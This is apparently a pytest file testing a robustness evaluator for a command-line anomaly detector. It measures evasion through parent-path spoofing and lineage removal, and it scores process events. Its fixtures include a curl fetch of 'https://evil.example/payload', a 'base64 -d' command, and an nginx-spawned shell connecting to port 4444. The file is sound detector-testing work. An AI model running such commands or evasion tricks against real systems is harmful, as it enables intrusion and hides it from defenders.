"""Tests for robustness evaluation runner (evaluation.robustness).

Validates the evaluation flow and RobustnessCard generation.
"""

import json
from pathlib import Path

import numpy as np
import pytest
from sklearn.ensemble import IsolationForest

from synthaea_ml.evaluation.robustness import (
    _create_synthetic_event_for_detection,
    _load_events_from_source,
    _score_cmdline,
    run_robustness_evaluation,
)
from synthaea_ml.features.cmdline import extract_features


@pytest.fixture
def dummy_model():
    """Create a minimal IsolationForest for testing."""
    # Train on benign samples
    benign_samples = [
        "bash\0-c\0echo hello\0",
        "ls\0-la\0",
        "whoami\0",
    ]
    X = np.array([extract_features(s) for s in benign_samples], dtype=np.float32)

    clf = IsolationForest(n_estimators=10, contamination=0.1, random_state=42)
    clf.fit(X)
    return clf


@pytest.fixture
def dummy_scenario_yaml(tmp_path: Path) -> Path:
    """Create a minimal scenario yaml for testing."""
    scenario_yaml = tmp_path / "test_scenario.yaml"
    scenario_yaml.write_text(
        """name: test_scenario
platform: linux
script: test.sh
simulates: Test scenario for robustness evaluation
expected_detections:
  - technique: "T1071"
    rule: test_rule
    min_count: 1
    tolerance: 0
""",
        encoding="utf-8",
    )
    return scenario_yaml


def test_score_cmdline(dummy_model) -> None:
    """Test scoring individual command lines."""
    benign = "bash\0-c\0echo hello\0"
    suspicious = "bash\0-c\0base64 -d\0"

    benign_score = _score_cmdline(dummy_model, benign, threshold=0.0)
    suspicious_score = _score_cmdline(dummy_model, suspicious, threshold=0.0)

    # Both should return float scores
    assert isinstance(benign_score, float)
    assert isinstance(suspicious_score, float)

    # With a small training set, scores may be similar - just check they're computed
    # Full discrimination is validated in integration tests with real models


def test_create_synthetic_event_for_detection() -> None:
    """Test synthetic event generation."""
    event = _create_synthetic_event_for_detection("T1071")
    assert "argv" in event
    assert isinstance(event["argv"], list)
    assert len(event["argv"]) > 0

    # Different techniques produce different events
    event1 = _create_synthetic_event_for_detection("T1071")
    event2 = _create_synthetic_event_for_detection("T1059")
    assert event1["argv"] != event2["argv"]


def test_run_robustness_evaluation(dummy_model, dummy_scenario_yaml) -> None:
    """Test full robustness evaluation flow."""
    card = run_robustness_evaluation(
        model=dummy_model,
        scenario_yaml=dummy_scenario_yaml,
        tier="T0",
        mutation_seed=42,
    )

    # Card structure
    assert card.scenario_name == "test_scenario"
    assert len(card.scenario_yaml_sha256) == 64  # SHA256 hex
    assert card.tested_at  # ISO timestamp

    # Metrics
    assert 0.0 <= card.escape_rate <= 1.0
    assert isinstance(card.median_score_degradation, float)
    assert isinstance(card.worst_case_degradation, float)

    # Mutation results
    assert len(card.mutation_results) > 0

    # Each result has required fields
    for result in card.mutation_results:
        assert result.mutation_class
        assert result.intensity in ["light", "medium", "heavy"]
        assert isinstance(result.original_score, float)
        assert isinstance(result.mutated_score, float)
        assert isinstance(result.score_delta, float)
        assert isinstance(result.escaped, bool)
        assert isinstance(result.seed, int)


def test_run_robustness_evaluation_deterministic(dummy_model, dummy_scenario_yaml) -> None:
    """Same seed produces same robustness card."""
    card1 = run_robustness_evaluation(
        model=dummy_model,
        scenario_yaml=dummy_scenario_yaml,
        tier="T0",
        mutation_seed=123,
    )

    card2 = run_robustness_evaluation(
        model=dummy_model,
        scenario_yaml=dummy_scenario_yaml,
        tier="T0",
        mutation_seed=123,
    )

    # Same metrics
    assert card1.escape_rate == card2.escape_rate
    assert card1.median_score_degradation == card2.median_score_degradation
    assert card1.worst_case_degradation == card2.worst_case_degradation

    # Same mutation results
    assert len(card1.mutation_results) == len(card2.mutation_results)


def test_run_robustness_evaluation_missing_scenario() -> None:
    """Missing scenario yaml raises FileNotFoundError."""
    clf = IsolationForest()
    clf.fit(np.random.randn(10, 9))

    with pytest.raises(FileNotFoundError):
        run_robustness_evaluation(
            model=clf,
            scenario_yaml=Path("/nonexistent/scenario.yaml"),
            tier="T0",
        )


class _LineageModel:
    """A stand-in 23-feature T1 model: anomalous exactly when the parent runs from a
    suspicious path (the last lineage feature). Deterministic, so a test can say which
    mutation moves the score and why."""

    n_features_in_ = 23

    def decision_function(self, rows):
        return np.array([-0.5 if row[-1] == 1.0 else 0.5 for row in rows])


def test_t1_runs_the_lineage_mutators_and_scores_the_lineage_fields(dummy_scenario_yaml) -> None:
    """#617: the T1 tier used to raise NotImplementedError because the scorer saw only
    the command line, so a lineage mutation could never move the score."""
    card = run_robustness_evaluation(
        model=_LineageModel(),
        scenario_yaml=dummy_scenario_yaml,
        tier="T1",
    )
    classes = {r.mutation_class for r in card.mutation_results}
    assert {"fake_parent_name", "parent_path", "remove_lineage"} <= classes
    # The model's only signal is the parent path, so mutating the path must move it:
    # system paths score benign, which is an escape from an originally detected sample.
    heavy_path = [
        r
        for r in card.mutation_results
        if r.mutation_class == "parent_path" and r.intensity == "heavy"
    ]
    assert heavy_path
    assert all(r.escaped and r.score_delta > 0 for r in heavy_path)
    assert card.escape_rate > 0.0


def test_t1_lineage_removal_moves_the_score_too(dummy_scenario_yaml) -> None:
    card = run_robustness_evaluation(
        model=_LineageModel(),
        scenario_yaml=dummy_scenario_yaml,
        tier="T1",
    )
    removed = [
        r
        for r in card.mutation_results
        if r.mutation_class == "remove_lineage" and r.intensity in ("medium", "heavy")
    ]
    assert removed
    assert all(r.escaped for r in removed), "no parent path means no suspicious path"


def test_t1_refuses_a_model_that_cannot_see_the_lineage(dummy_model, dummy_scenario_yaml) -> None:
    """A 9-feature T0 model scored on the T1 tier would silently ignore every lineage
    mutation and report a flattering escape rate."""
    with pytest.raises(ValueError, match="23 features"):
        run_robustness_evaluation(
            model=dummy_model,
            scenario_yaml=dummy_scenario_yaml,
            tier="T1",
        )


def test_t0_never_scores_the_lineage(dummy_model, dummy_scenario_yaml) -> None:
    """T0 output is unchanged by the T1 work: no lineage mutators, no lineage fields."""
    card = run_robustness_evaluation(
        model=dummy_model,
        scenario_yaml=dummy_scenario_yaml,
        tier="T0",
    )
    classes = {r.mutation_class for r in card.mutation_results}
    assert not classes & {"fake_parent_name", "parent_path", "remove_lineage"}
    assert "parent_comm" not in _create_synthetic_event_for_detection("T1059")


def test_t1_synthetic_events_carry_the_lineage_the_technique_arrives_with() -> None:
    event = _create_synthetic_event_for_detection("T1059", tier="T1")
    assert event["parent_comm"] == "nginx"
    assert event["parent_image_path"] == "/usr/sbin/nginx"


def _write_jsonl(path: Path, records: list[dict]) -> None:
    path.write_text("\n".join(json.dumps(r) for r in records), encoding="utf-8")


def test_t1_loader_keeps_lineage_and_computes_correlation_context(tmp_path: Path) -> None:
    """The source loader used to keep only argv/cmdline, so real captures lost the
    parent fields before they could be scored or mutated."""
    src = tmp_path / "events.jsonl"
    _write_jsonl(
        src,
        [
            {
                "type": "exec",
                "pid": 7,
                "ts_ns": 1_000_000_000,
                "argv": ["sh"],
                "parent_comm": "nginx",
                "parent_image_path": "/usr/sbin/nginx",
            },
            {
                "type": "connect",
                "pid": 7,
                "ts_ns": 3_000_000_000,
                "daddr_v4": [10, 0, 0, 1],
                "dport": 4444,
            },
        ],
    )
    plain = _load_events_from_source(src)
    assert plain[0]["parent_comm"] == "nginx"
    assert "correlation_features" not in plain[0]

    with_context = _load_events_from_source(src, with_context=True)
    spawn, connect, *_ = with_context[0]["correlation_features"]
    assert (spawn, connect) == (1.0, 1.0)


def test_t1_loader_keeps_a_recycled_pids_earlier_life_out_of_the_context(tmp_path: Path) -> None:
    """#590/#617: the correlation context of a pid is filtered by its incarnation."""
    src = tmp_path / "events.jsonl"
    _write_jsonl(
        src,
        [
            {"type": "exec", "pid": 7, "process_generation": 1, "ts_ns": 1, "argv": ["a"]},
            {
                "type": "connect",
                "pid": 7,
                "process_generation": 1,
                "ts_ns": 2,
                "daddr_v4": [10, 0, 0, 1],
                "dport": 80,
            },
            {"type": "exec", "pid": 7, "process_generation": 2, "ts_ns": 3, "argv": ["b"]},
        ],
    )
    events = _load_events_from_source(src, with_context=True)
    second_life = next(e for e in events if e["process_generation"] == 2)
    assert second_life["correlation_features"][1] == 0.0, "the old life's connect must not leak"


def test_run_robustness_evaluation_t2_not_implemented(dummy_model, dummy_scenario_yaml) -> None:
    """T2 tier raises NotImplementedError."""
    with pytest.raises(NotImplementedError, match="T2"):
        run_robustness_evaluation(
            model=dummy_model,
            scenario_yaml=dummy_scenario_yaml,
            tier="T2",
        )


def test_load_events_from_source(tmp_path: Path) -> None:
    """Test loading events from JSONL file."""
    # Create test events.jsonl
    events_file = tmp_path / "events.jsonl"
    events_file.write_text(
        '{"type":"exec","argv":["bash","-c","echo test"],"cmdline":"bash -c \'echo test\'"}\n'
        '{"type":"exec","argv":["curl","https://example.com"]}\n'
        '{"type":"file_open","path":"/tmp/test"}\n'  # Not an exec, should be filtered
        '{"argv":["ls","-la"]}\n'  # Baseline format
        '\n',  # Blank line, should be skipped
        encoding="utf-8",
    )

    events = _load_events_from_source(events_file)

    # Should load 3 exec events (2 with type="exec", 1 baseline format)
    assert len(events) == 3
    assert events[0]["argv"] == ["bash", "-c", "echo test"]
    assert events[1]["argv"] == ["curl", "https://example.com"]
    assert events[2]["argv"] == ["ls", "-la"]


def test_load_events_from_source_missing_file() -> None:
    """Test loading from missing file raises FileNotFoundError."""
    with pytest.raises(FileNotFoundError):
        _load_events_from_source(Path("/nonexistent/events.jsonl"))


def test_run_robustness_evaluation_with_events_source(
    dummy_model, dummy_scenario_yaml, tmp_path: Path
) -> None:
    """Test robustness evaluation with real events from file."""
    # Create test events file
    events_file = tmp_path / "events.jsonl"
    events_file.write_text(
        '{"argv":["bash","-c","base64 -d"]}\n'
        '{"argv":["curl","-fsSL","https://evil.example/payload"]}\n',
        encoding="utf-8",
    )

    card = run_robustness_evaluation(
        model=dummy_model,
        scenario_yaml=dummy_scenario_yaml,
        tier="T0",
        mutation_seed=42,
        events_source=events_file,
    )

    # Should have more mutations (2 events × 5 mutators × 3 intensities)
    assert len(card.mutation_results) > 0

    # Metrics should still be computed
    assert 0.0 <= card.escape_rate <= 1.0
    assert isinstance(card.median_score_degradation, float)
    assert isinstance(card.worst_case_degradation, float)
